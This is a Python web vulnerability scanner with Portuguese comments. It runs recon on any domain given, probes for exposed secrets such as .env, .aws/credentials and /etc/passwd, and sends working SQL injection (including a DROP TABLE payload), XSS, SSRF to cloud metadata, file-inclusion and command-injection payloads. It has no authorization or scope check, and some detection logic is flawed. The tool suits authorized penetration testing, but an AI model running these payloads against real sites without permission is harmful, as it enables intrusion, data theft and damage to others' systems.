#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Backend Vulnerability Scanner - Teste de vulnerabilidades em sites
Usa os sistemas existentes: black_hat_intelligence + web_search
"""

import sys
import json
import time
import hashlib
import re
import os
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime
import urllib.request
import urllib.parse
import urllib.error
import ssl
import socket
import subprocess

# Adicionar path para módulos do OpenCode
OPCODE_PATH = Path.home() / '.config' / 'opencode'
sys.path.insert(0, str(OPCODE_PATH))

try:
    import nodejs  # Se disponível
except:
    nodejs = None


# ============================================================
# CONFIGURAÇÕES
# ============================================================

@dataclass
class ScanConfig:
    """Configuração do scan"""
    target: str = ""
    timeout: int = 10
    max_redirects: int = 5
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    threads: int = 10
    verbose: bool = True
    save_results: bool = True
    output_dir: str = "scan_results"
    
    # Tipos de vulnerabilidade para testar
    vuln_types: List[str] = field(default_factory=lambda: [
        'sqli', 'xss', 'ssrf', 'rce', 'idor', 'csrf',
        'open_redirect', 'lfi', 'rfi', 'xxe', 'command_injection',
        'path_traversal', 'xml_injection', 'ldap_injection',
        'server_side_template', ' Deserialization', 'cicd'
    ])
    
    # Endpoints conhecidos para testar
    common_paths: List[str] = field(default_factory=lambda: [
        '/admin', '/login', '/api', '/graphql', '/graphql-explorer',
        '/swagger.json', '/swagger-ui.html', '/api-docs', '/docs',
        '/.env', '/config.php', '/wp-admin', '/wp-config.php',
        '/phpmyadmin', '/admin.php', '/login.php', '/backup',
        '/robots.txt', '/sitemap.xml', '/.git/config', '/.svn/entries',
        '/api/v1', '/api/v2', '/graphql', '/graphiql',
        '/actuator', '/actuator/env', '/actuator/health',
        '/console', '/debug', '/trace', '/metrics',
        '/web.config', '/web.xml', '/server-status',
        '/cgi-bin/', '/scripts/', '/test', '/debug',
        '/backup.sql', '/database.sql', '/dump.sql',
        '/.aws/credentials', '/.ssh/authorized_keys',
        '/etc/passwd', '/proc/self/environ',
        '/wp-content/uploads/', '/upload/', '/files/'
    ])


# ============================================================
# CLASSES PRINCIPAIS
# ============================================================

class TargetRecon:
    """Reconhecimento do alvo"""
    
    def __init__(self, config: ScanConfig):
        self.config = config
        self.target = config.target
        self.ip = None
        self.port = 80
        self.headers = {}
        self.technologies = []
        self.endpoints = []
        self.params = []
        
    def resolve(self) -> bool:
        """Resolve o domínio para IP"""
        try:
            self.ip = socket.gethostbyname(self.target)
            if self.config.verbose:
                print(f"  [RECON] IP: {self.ip}")
            return True
        except socket.gaierror:
            print(f"  [ERROR] Cannot resolve {self.target}")
            return False
    
    def get_headers(self) -> Dict:
        """Obtém headers do servidor"""
        try:
            url = f"http://{self.target}"
            req = urllib.request.Request(url, headers={'User-Agent': self.config.user_agent})
            with urllib.request.urlopen(req, timeout=self.config.timeout) as resp:
                self.headers = dict(resp.headers)
                if self.config.verbose:
                    print(f"  [RECON] Server: {self.headers.get('Server', 'Unknown')}")
                    print(f"  [RECON] X-Powered-By: {self.headers.get('X-Powered-By', 'Unknown')}")
                    print(f"  [RECON] X-Frame-Options: {self.headers.get('X-Frame-Options', 'Not set')}")
            return self.headers
        except Exception as e:
            if self.config.verbose:
                print(f"  [WARN] Header scan failed: {e}")
            return {}
    
    def detect_technologies(self) -> List[str]:
        """Detecta tecnologias usadas"""
        techs = []
        body = ""
        
        try:
            url = f"http://{self.target}"
            req = urllib.request.Request(url, headers={'User-Agent': self.config.user_agent})
            with urllib.request.urlopen(req, timeout=self.config.timeout) as resp:
                body = resp.read().decode('utf-8', errors='ignore')
                self.headers = dict(resp.headers)
        except:
            pass
        
        # Detectar tecnologias comuns
        patterns = {
            'WordPress': r'<meta name="generator" content="WordPress',
            'Joomla': r'<meta name="generator" content="Joomla',
            'Drupal': r'<meta name="generator" content="Drupal',
            'Laravel': r'Laravel',
            'Django': r'SETTINGS\.py',
            'Express': r'X-Powered-By: Express',
            'PHP': r'\.php',
            'ASP.NET': r'ASP\.NET',
            'nginx': r'Server: nginx',
            'Apache': r'Server: Apache',
            'Cloudflare': r'cloudflare',
            'AWS': r'aws',
            'Docker': r'docker',
        }
        
        for tech, pattern in patterns.items():
            if re.search(pattern, body, re.IGNORECASE) or re.search(pattern, str(self.headers), re.IGNORECASE):
                techs.append(tech)
        
        self.technologies = techs
        if self.config.verbose and techs:
            print(f"  [RECON] Technologies: {', '.join(techs)}")
        
        return techs
    
    def find_endpoints(self) -> List[str]:
        """Encontra endpoints comuns"""
        endpoints = []
        
        for path in self.config.common_paths:
            url = f"http://{self.target}{path}"
            try:
                req = urllib.request.Request(url, headers={'User-Agent': self.config.user_agent})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    status = resp.status
                    if status in [200, 301, 302, 403, 404, 500]:
                        endpoints.append({
                            'path': path,
                            'status': status,
                            'url': url
                        })
                        if self.config.verbose and status in [200, 301, 302]:
                            print(f"  [ENDPOINT] {path} → {status}")
            except urllib.error.HTTPError as e:
                if e.code in [200, 301, 302, 403, 404]:
                    endpoints.append({
                        'path': path,
                        'status': e.code,
                        'url': url
                    })
            except:
                pass
        
        self.endpoints = endpoints
        return endpoints
    
    def find_params(self) -> List[Dict]:
        """Encontra parâmetros nas URLs"""
        params = []
        
        try:
            url = f"http://{self.target}"
            req = urllib.request.Request(url, headers={'User-Agent': self.config.user_agent})
            with urllib.request.urlopen(req, timeout=self.config.timeout) as resp:
                body = resp.read().decode('utf-8', errors='ignore')
                
                # Procurar formulários
                form_patterns = re.findall(r'<form[^>]*action="([^"]*)"[^>]*>', body, re.IGNORECASE)
                for form in form_patterns:
                    params.append({
                        'type': 'form',
                        'action': form,
                        'method': 'POST' if 'method="post"' in body.lower() else 'GET'
                    })
                
                # Procurar parâmetros na URL
                url_params = re.findall(r'[?&]([a-zA-Z0-9_]+)=', body)
                for param in set(url_params):
                    params.append({
                        'type': 'parameter',
                        'name': param,
                        'location': 'url'
                    })
                    
        except:
            pass
        
        self.params = params
        return params
    
    def run(self) -> Dict:
        """Executa reconhecimento completo"""
        print("\n  [RECON] Starting target reconnaissance...")
        print(f"  [RECON] Target: {self.target}")
        
        result = {
            'target': self.target,
            'ip': None,
            'headers': {},
            'technologies': [],
            'endpoints': [],
            'params': [],
            'vulnerabilities': [],
            'scan_time': datetime.now().isoformat()
        }
        
        # Resolve IP
        if not self.resolve():
            return result
        
        result['ip'] = self.ip
        
        # Get headers
        self.get_headers()
        result['headers'] = self.headers
        
        # Detect technologies
        self.detect_technologies()
        result['technologies'] = self.technologies
        
        # Find endpoints
        self.find_endpoints()
        result['endpoints'] = self.endpoints
        
        # Find params
        self.find_params()
        result['params'] = self.params
        
        print(f"  [OK] Recon complete. Found {len(self.endpoints)} endpoints, {len(self.params)} params")
        
        return result


class VulnerabilityScanner:
    """Scanner de vulnerabilidades"""
    
    def __init__(self, config: ScanConfig, recon_result: Dict):
        self.config = config
        self.recon = recon_result
        self.vulnerabilities = []
        
    def test_sqli(self) -> List[Dict]:
        """Testa SQL Injection"""
        vulns = []
        
        # Payloads de teste
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "\" OR \"1\"=\"1",
            "1' OR '1'='1' --",
            "1' OR 1=1 --",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL--",
            "admin'--",
            "' OR 'x'='x",
            "'; DROP TABLE users--",
            "1; SELECT * FROM users--",
        ]
        
        # Testar em endpoints com parâmetros
        for endpoint in self.recon.get('endpoints', []):
            url = endpoint['url']
            
            # Adicionar parâmetro se não existir
            if '?' not in url:
                url += '?id='
            else:
                url += '&id='
            
            for payload in payloads[:5]:  # Limitar testes
                try:
                    test_url = url + urllib.parse.quote(payload)
                    req = urllib.request.Request(test_url, headers={'User-Agent': self.config.user_agent})
                    with urllib.request.urlopen(req, timeout=self.config.timeout) as resp:
                        body = resp.read().decode('utf-8', errors='ignore')
                        status = resp.status
                        
                        # Verificar sinais de SQLi
                        if any(sig in body for sig in ['SQL syntax', 'mysql_fetch', 'mysqli_', 
                                                       'ODBC SQL', 'Oracle error', 'PostgreSQL',
                                                       'unclosed quotation mark', 'SQL server',
                                                       'You have an error in your SQL']):
                            vulns.append({
                                'type': 'SQL Injection',
                                'severity': 'HIGH',
                                'url': test_url,
                                'payload': payload,
                                'evidence': 'SQL error in response'
                            })
                            
                except Exception as e:
                    # Erro pode indicar SQLi
                    if 'sql' in str(e).lower():
                        vulns.append({
                            'type': 'SQL Injection',
                            'severity': 'MEDIUM',
                            'url': test_url,
                            'payload': payload,
                            'evidence': str(e)[:100]
                        })
        
        return vulns
    
    def test_xss(self) -> List[Dict]:
        """Testa Cross-Site Scripting"""
        vulns = []
        
        payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert(1)>',
            '"><img src=x onerror=alert(1)>',
        ]
        
        for endpoint in self.recon.get('endpoints', []):
            url = endpoint['url']
            
            # Adicionar parâmetro se não existir
            if '?' not in url:
                url += '?q='
            else:
                url += '&q='
            
            for payload in payloads[:3]:
                try:
                    test_url = url + urllib.parse.quote(payload)
                    req = urllib.request.Request(test_url, headers={'User-Agent': self.config.user_agent})
                    with urllib.request.urlopen(req, timeout=self.config.timeout) as resp:
                        body = resp.read().decode('utf-8', errors='ignore')
                        
                        # Verificar se o payload foi refletido
                        if payload.replace(' ', '%20') in body or payload in body:
                            # Verificar se há proteção
                            if 'X-XSS-Protection' not in resp.headers:
                                vulns.append({
                                    'type': 'Reflected XSS',
                                    'severity': 'HIGH',
                                    'url': test_url,
                                    'payload': payload,
                                    'reflected': True,
                                    'protection': 'Missing X-XSS-Protection'
                                })
                            
                except:
                    pass
        
        return vulns
    
    def test_ssrf(self) -> List[Dict]:
        """Testa Server-Side Request Forgery"""
        vulns = []
        
        # Payloads SSRF
        payloads = [
            'http://169.254.169.254/latest/meta-data/',
            'http://localhost:8080/',
            'http://127.0.0.1:22/',
            'file:///etc/passwd',
            'gopher://127.0.0.1:6379/',
            'dict://127.0.0.1:6379/',
        ]
        
        for endpoint in self.recon.get('endpoints', []):
            url = endpoint['url']
            
            for payload in payloads[:2]:
                try:
                    test_url = url.replace('http://', payload) if 'url=' in url else url + f'?url={payload}'
                    req = urllib.request.Request(test_url, headers={'User-Agent': self.config.user_agent})
                    with urllib.request.urlopen(req, timeout=5) as resp:
                        body = resp.read().decode('utf-8', errors='ignore')
                        
                        # Verificar resposta da meta-data
                        if 'ami-id' in body or 'instance-id' in body or 'aws' in body:
                            vulns.append({
                                'type': 'SSRF - AWS Metadata',
                                'severity': 'CRITICAL',
                                'url': test_url,
                                'payload': payload,
                                'evidence': 'AWS metadata accessible'
                            })
                            
                except urllib.error.HTTPError:
                    pass
                except Exception:
                    pass
        
        return vulns
    
    def test_path_traversal(self) -> List[Dict]:
        """Testa Path Traversal"""
        vulns = []
        
        payloads = [
            '../etc/passwd',
            '..\\..\\windows\\system32\\config\\sam',
            '%2e%2e/%2e%2e/etc/passwd',
            '....//....//etc/passwd',
            '/etc/passwd',
        ]
        
        for endpoint in self.recon.get('endpoints', []):
            url = endpoint['url']
            
            for payload in payloads[:3]:
                try:
                    # Adicionar ao path
                    if '/file=' in url or '/path=' in url:
                        test_url = url.replace('file=', f'file={payload}').replace('path=', f'path={payload}')
                    else:
                        test_url = url + '/' + payload
                    
                    req = urllib.request.Request(test_url, headers={'User-Agent': self.config.user_agent})
                    with urllib.request.urlopen(req, timeout=self.config.timeout) as resp:
                        body = resp.read().decode('utf-8', errors='ignore')
                        
                        if 'root:' in body and ':/bin/' in body:
                            vulns.append({
                                'type': 'Path Traversal',
                                'severity': 'HIGH',
                                'url': test_url,
                                'payload': payload,
                                'evidence': '/etc/passwd content disclosed'
                            })
                            
                except:
                    pass
        
        return vulns
    
    def test_lfi_rfi(self) -> List[Dict]:
        """Testa Local/Remote File Inclusion"""
        vulns = []
        
        payloads = [
            'php://filter/convert.base64-encode/resource=index.php',
            'php://input',
            'expect://id',
            'https://raw.githubusercontent.com/offensive-security/exploit-database/master/exploits/phpphello.txt',
        ]
        
        for endpoint in self.recon.get('endpoints', []):
            url = endpoint['url']
            
            for payload in payloads[:2]:
                try:
                    if 'file=' in url or 'page=' in url:
                        param = 'file' if 'file=' in url else 'page'
                        test_url = url.replace(f'{param}=', f'{param}={payload}')
                    else:
                        test_url = url + f'?file={payload}'
                    
                    req = urllib.request.Request(test_url, headers={'User-Agent': self.config.user_agent})
                    with urllib.request.urlopen(req, timeout=self.config.timeout) as resp:
                        body = resp.read().decode('utf-8', errors='ignore')
                        
                        # Verificar inclusão
                        if 'Base64' in body or 'PH' in body[:100] or '<?php' in body:
                            vulns.append({
                                'type': 'LFI/RFI',
                                'severity': 'CRITICAL',
                                'url': test_url,
                                'payload': payload,
                                'evidence': 'File inclusion detected'
                            })
                            
                except:
                    pass
        
        return vulns
    
    def test_command_injection(self) -> List[Dict]:
        """Testa Command Injection"""
        vulns = []
        
        payloads = [
            '; id',
            '| id',
            '&& id',
            '`id`',
            '$(id)',
            '%0aid',
        ]
        
        for endpoint in self.recon.get('endpoints', []):
            url = endpoint['url']
            
            for payload in payloads[:3]:
                try:
                    if 'cmd=' in url or 'exec=' in url:
                        param = 'cmd' if 'cmd=' in url else 'exec'
                        test_url = url.replace(f'{param}=', f'{param}={payload}')
                    else:
                        test_url = url + f'?cmd={payload}'
                    
                    req = urllib.request.Request(test_url, headers={'User-Agent': self.config.user_agent})
                    with urllib.request.urlopen(req, timeout=self.config.timeout) as resp:
                        body = resp.read().decode('utf-8', errors='ignore')
                        
                        if 'uid=' in body and 'gid=' in body and 'groups=' in body:
                            vulns.append({
                                'type': 'Command Injection',
                                'severity': 'CRITICAL',
                                'url': test_url,
                                'payload': payload,
                                'evidence': 'Command execution detected (id output)'
                            })
                            
                except:
                    pass
        
        return vulns
    
    def test_idor(self) -> List[Dict]:
        """Testa Insecure Direct Object References"""
        vulns = []
        
        # Procurar IDs numéricos nas URLs
        id_patterns = re.findall(r'/(\d+)', str(self.recon.get('endpoints', [])))
        
        for endpoint in self.recon.get('endpoints', []):
            url = endpoint['url']
            
            # Testar variação de IDs
            for num in [1, 2, 99999]:
                test_url = re.sub(r'/\d+', f'/{num}', url)
                
                try:
                    req = urllib.request.Request(test_url, headers={'User-Agent': self.config.user_agent})
                    with urllib.request.urlopen(req, timeout=self.config.timeout) as resp:
                        if resp.status == 200:
                            vulns.append({
                                'type': 'IDOR',
                                'severity': 'MEDIUM',
                                'url': test_url,
                                'evidence': f'Access with ID {num} returned 200'
                            })
                            break
                except:
                    pass
        
        return vulns
    
    def test_csrf(self) -> List[Dict]:
        """Testa CSRF (ausência de proteção)"""
        vulns = []
        
        for endpoint in self.recon.get('endpoints', []):
            url = endpoint['url']
            
            # Verificar se tem token CSRF
            if '/login' in url or '/register' in url or '/change' in url:
                try:
                    req = urllib.request.Request(url, headers={'User-Agent': self.config.user_agent})
                    with urllib.request.urlopen(req, timeout=self.config.timeout) as resp:
                        body = resp.read().decode('utf-8', errors='ignore')
                        
                        # Verificar tokens CSRF
                        has_token = any(tok in body.lower() for tok in ['csrf', 'authenticity', 'token'])
                        has_header = 'X-CSRF-Token' in resp.headers or 'Cache-Control' in resp.headers
                        
                        if not has_token and not has_header:
                            vulns.append({
                                'type': 'CSRF Missing Token',
                                'severity': 'MEDIUM',
                                'url': url,
                                'evidence': 'No CSRF token found in form'
                            })
                            
                except:
                    pass
        
        return vulns
    
    def test_sensitive_files(self) -> List[Dict]:
        """Testa arquivos sensíveis expostos"""
        vulns = []
        
        sensitive_files = [
            '/.env',
            '/.git/config',
            '/.svn/entries',
            '/config.php',
            '/wp-config.php',
            '/phpinfo.php',
            '/server-status',
            '/server-info',
            '/.aws/credentials',
            '/.ssh/authorized_keys',
            '/backup.sql',
            '/database.sql',
            '/dump.sql',
            '/web.config',
        ]
        
        for path in sensitive_files:
            url = f"http://{self.config.target}{path}"
            
            try:
                req = urllib.request.Request(url, headers={'User-Agent': self.config.user_agent})
                with urllib.request.urlopen(req, timeout=self.config.timeout) as resp:
                    if resp.status == 200:
                        body = resp.read().decode('utf-8', errors='ignore')[:500]
                        
                        vulns.append({
                            'type': 'Sensitive File Exposure',
                            'severity': 'HIGH',
                            'url': url,
                            'path': path,
                            'evidence': f'Content length: {len(body)} bytes'
                        })
                        
            except urllib.error.HTTPError as e:
                if e.code == 200:
                    vulns.append({
                        'type': 'Sensitive File Exposure',
                        'severity': 'HIGH',
                        'url': url,
                        'path': path,
                        'evidence': 'File accessible (HTTP 200)'
                    })
            except:
                pass
        
        return vulns
    
    def run_all_tests(self) -> List[Dict]:
        """Executa todos os testes"""
        print("\n  [SCAN] Starting vulnerability tests...")
        
        tests = [
            ('Sensitive Files', self.test_sensitive_files),
            ('SQL Injection', self.test_sqli),
            ('XSS', self.test_xss),
            ('SSRF', self.test_ssrf),
            ('Path Traversal', self.test_path_traversal),
            ('LFI/RFI', self.test_lfi_rfi),
            ('Command Injection', self.test_command_injection),
            ('IDOR', self.test_idor),
            ('CSRF', self.test_csrf),
        ]
        
        for name, test_func in tests:
            if self.config.verbose:
                print(f"  [TEST] Running {name}...")
            
            try:
                results = test_func()
                self.vulnerabilities.extend(results)
                
                if results:
                    print(f"  [FOUND] {name}: {len(results)} vuln(s)")
                else:
                    print(f"  [OK] {name}: No vulnerabilities")
                    
            except Exception as e:
                print(f"  [ERROR] {name}: {e}")
        
        return self.vulnerabilities


class IntelligenceCollector:
    """Coleta inteligência usando sistemas existentes"""
    
    def __init__(self, target: str):
        self.target = target
        self.intel = {
            'cves': [],
            'exploits': [],
            'discussions': [],
            'github': [],
        }
    
    def search_cve(self) -> List[Dict]:
        """Busca CVEs relacionados"""
        cves = []
        
        # Query para busca de CVE
        query = f"{self.target} vulnerability CVE"
        
        try:
            # Usar web_search se disponível
            if 'webSearch' in globals():
                results = webSearch.searchCVE(query)
                cves = results.get('results', [])
        except:
            pass
        
        self.intel['cves'] = cves
        return cves
    
    def search_exploits(self) -> List[Dict]:
        """Busca exploits no Exploit-DB"""
        exploits = []
        
        query = f"{self.target} exploit"
        
        try:
            if 'webSearch' in globals():
                results = webSearch.searchExploits(query)
                exploits = results.get('results', [])
        except:
            pass
        
        self.intel['exploits'] = exploits
        return exploits
    
    def search_github(self) -> List[Dict]:
        """Busca no GitHub"""
        github = []
        
        query = f"{self.target} source code"
        
        try:
            if 'webSearch' in globals():
                results = webSearch.searchGitHub(query)
                github = results.get('results', [])
        except:
            pass
        
        self.intel['github'] = github
        return github
    
    def run(self) -> Dict:
        """Executa coleta de inteligência"""
        print("\n  [INTEL] Collecting intelligence...")
        
        self.search_cve()
        self.search_exploits()
        self.search_github()
        
        total = len(self.intel['cves']) + len(self.intel['exploits']) + len(self.intel['github'])
        print(f"  [OK] Collected {total} intelligence items")
        
        return self.intel


# ============================================================
# FUNÇÕES PRINCIPAIS
# ============================================================

def run_scan(target: str, verbose: bool = True) -> Dict:
    """Executa scan completo"""
    
    config = ScanConfig(
        target=target,
        verbose=verbose,
        timeout=10
    )
    
    print("=" * 60)
    print(f"  BACKEND VULNERABILITY SCANNER v1.0")
    print(f"  Target: {target}")
    print("=" * 60)
    
    # Step 1: Reconhecimento
    recon = TargetRecon(config)
    recon_result = recon.run()
    
    # Step 2: Scanner de vulnerabilidades
    scanner = VulnerabilityScanner(config, recon_result)
    vulnerabilities = scanner.run_all_tests()
    
    # Step 3: Coleta de inteligência
    intel = IntelligenceCollector(target).run()
    
    # Consolidar resultados
    results = {
        'target': target,
        'ip': recon_result.get('ip'),
        'technologies': recon_result.get('technologies', []),
        'endpoints': recon_result.get('endpoints', []),
        'vulnerabilities': vulnerabilities,
        'intelligence': intel,
        'summary': {
            'total_vulns': len(vulnerabilities),
            'critical': len([v for v in vulnerabilities if v.get('severity') == 'CRITICAL']),
            'high': len([v for v in vulnerabilities if v.get('severity') == 'HIGH']),
            'medium': len([v for v in vulnerabilities if v.get('severity') == 'MEDIUM']),
            'low': len([v for v in vulnerabilities if v.get('severity') == 'LOW']),
        },
        'scan_time': datetime.now().isoformat()
    }
    
    # Print summary
    print("\n" + "=" * 60)
    print("  SCAN SUMMARY")
    print("=" * 60)
    print(f"  Target: {target}")
    print(f"  IP: {results['ip']}")
    print(f"  Technologies: {', '.join(results['technologies']) or 'Unknown'}")
    print(f"  Endpoints found: {len(results['endpoints'])}")
    print(f"  Vulnerabilities: {results['summary']['total_vulns']}")
    print(f"    - CRITICAL: {results['summary']['critical']}")
    print(f"    - HIGH: {results['summary']['high']}")
    print(f"    - MEDIUM: {results['summary']['medium']}")
    print(f"    - LOW: {results['summary']['low']}")
    print("=" * 60)
    
    # Salvar resultados
    if config.save_results:
        output_dir = Path(config.output_dir)
        output_dir.mkdir(exist_ok=True)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        safe_target = re.sub(r'[^\w\-]', '_', target)
        output_file = output_dir / f"scan_{safe_target}_{timestamp}.json"
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False, default=str)
        
        print(f"\n  [SAVE] Results saved to: {output_file}")
    
    return results


def interactive_scan():
    """Modo interativo"""
    print("\n" + "=" * 60)
    print("  BACKEND VULNERABILITY SCANNER - Interactive Mode")
    print("=" * 60)
    print()
    print("  Commands:")
    print("    scan <target>   - Run full scan")
    print("    recon <target>  - Recon only")
    print("    help            - Show this help")
    print("    exit            - Exit")
    print()
    
    while True:
        try:
            cmd = input("\n> ").strip()
            
            if not cmd:
                continue
            elif cmd.lower() in ('exit', 'quit', 'q'):
                print("[BYE] Exiting...")
                break
            elif cmd.lower() == 'help':
                print("  Commands:")
                print("    scan <target>   - Run full scan")
                print("    recon <target>  - Recon only")
                print("    help            - Show this help")
                print("    exit            - Exit")
            elif cmd.startswith('scan '):
                target = cmd[5:].strip()
                if target:
                    run_scan(target)
                else:
                    print("  [ERROR] Please provide a target domain")
            elif cmd.startswith('recon '):
                target = cmd[6:].strip()
                if target:
                    config = ScanConfig(target=target, verbose=True)
                    recon = TargetRecon(config)
                    recon_result = recon.run()
                    print(f"\n  [RESULT] Target: {target}")
                    print(f"  [IP] {recon_result.get('ip')}")
                    print(f"  [Tech] {', '.join(recon_result.get('technologies', []))}")
                    print(f"  [Endpoints] {len(recon_result.get('endpoints', []))}")
                else:
                    print("  [ERROR] Please provide a target domain")
            else:
                print(f"  [INFO] Unknown command: {cmd}")
                
        except KeyboardInterrupt:
            print("\n  [BYE] Exiting...")
            break
        except Exception as e:
            print(f"  [ERROR] {e}")


# ============================================================
# ENTRY POINT
# ============================================================

if __name__ == "__main__":
    if len(sys.argv) > 1:
        target = sys.argv[1]
        run_scan(target)
    else:
        interactive_scan()
